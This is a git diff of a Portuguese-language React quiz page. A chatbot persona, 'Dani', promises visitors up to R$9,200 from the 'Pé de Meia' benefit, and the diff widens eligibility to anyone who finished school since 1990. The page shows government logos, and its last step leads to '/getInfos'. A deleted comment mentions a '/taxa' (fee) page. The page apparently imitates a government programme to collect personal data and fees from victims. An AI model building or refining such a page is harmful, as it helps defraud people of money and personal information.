@@ -58,9 +58,7 @@ function Quiz() {
   const [animando, setAnimando] = useState(false);
 
   function changeText() {
-    // 👉 se for o último passo, navega pra /taxa
     if (step === TOTAL_STEPS - 1) {
-      // use absolute path so navigation works regardless of current route
       navigate("/getInfos");
       return;
     }
@@ -83,20 +81,20 @@ function Quiz() {
       <div
         id="messageShadow"
         className='border-1 border-black w-[90%] rounded-2xl absolute top-36 mx-auto left-1/2 
-        -translate-x-1/2 px-4 py-2 bg-white'
+        -translate-x-1/2 px-4 py-2 bg-white mb-20'
       >
         <p className='text-center font-normal'>
-          Olá, meu nome é Dani!😊 e eu vou te ajudar a descobrir 
+          Olá, meu nome é Dani!😊 e eu vou te ajudar a descobrir
           se você tem o direito ao <span className='font-bold'> Pé de Meia </span> após a conclusão do ensino médio
-          a partir do <span className='font-bold'>ano 2000</span> e receber até <span className='font-bold'>R$9.200,00</span> 😍
+          a partir do <span className='font-bold'>ano 1990</span> e receber até <span className='font-bold'>R$9.200,00</span> 😍
         </p>
       </div>
 
-      <div className="mt-25 text-center">
-        <h2>Escolha uma opção abaixo</h2>
+      <div className="mt-[130px] text-center">
+        <h2 className="font-semibold">Escolha uma opção abaixo</h2>
 
         <div
-          className={`flex flex-col transition-opacity duration-200 ${animando ? "opacity-0" : "opacity-100"
+          className={`mt-8 flex flex-col transition-opacity duration-200 ${animando ? "opacity-0" : "opacity-100"
             }`}
         >
           <button
@@ -125,9 +123,9 @@ function Quiz() {
         </div>
       </div>
 
-      <footer className="bg-[var(--azul-footer)] flex py-7 justify-center gap-20 mt-auto">
-        <img src={gov1} alt="Gov1" className="w-30 object-contain" />
-        <img src={gov2} alt="Gov2" className="w-30 object-contain" />
+      <footer className="bg-[var(--azul-footer)] flex py-3 justify-center gap-20 mt-auto">
+        <img src={gov1} alt="Gov1" className="w-20 object-contain" />
+        <img src={gov2} alt="Gov2" className="w-20 object-contain" />
       </footer>
     </main>
   );
